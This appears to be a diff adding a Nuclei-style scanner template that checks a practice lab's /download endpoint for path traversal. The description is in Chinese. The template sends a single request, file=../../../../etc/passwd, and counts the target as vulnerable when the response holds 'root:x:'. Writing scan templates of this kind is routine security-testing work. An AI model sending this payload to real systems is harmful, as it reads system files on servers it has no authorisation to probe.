@@ -1,0 +1,21 @@
+id: sentinel-lab-path-traversal
+
+info:
+  name: Sentinel Lab 目录穿越
+  author: sentinel
+  severity: high
+  description: 靶场 /download 的 file 参数未规范化, 可读取任意文件
+  tags: lfi,traversal,lab
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/download?file=../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "root:x:"
